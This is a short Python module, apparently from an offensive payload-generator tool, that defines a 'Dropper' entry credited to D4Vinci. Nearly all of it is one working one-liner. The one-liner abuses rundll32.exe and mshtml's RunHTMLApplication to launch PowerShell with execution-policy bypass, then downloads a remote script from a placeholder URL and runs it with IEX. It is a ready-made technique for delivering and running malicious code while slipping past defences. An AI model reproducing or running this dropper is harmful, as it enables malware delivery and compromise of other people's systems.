class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Using rundll32.exe to download and execute a PowerShell file(PS1)."
    function    = "Dropper"
    liner     = "rundll32.exe javascript:\"..\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('URL');\")"
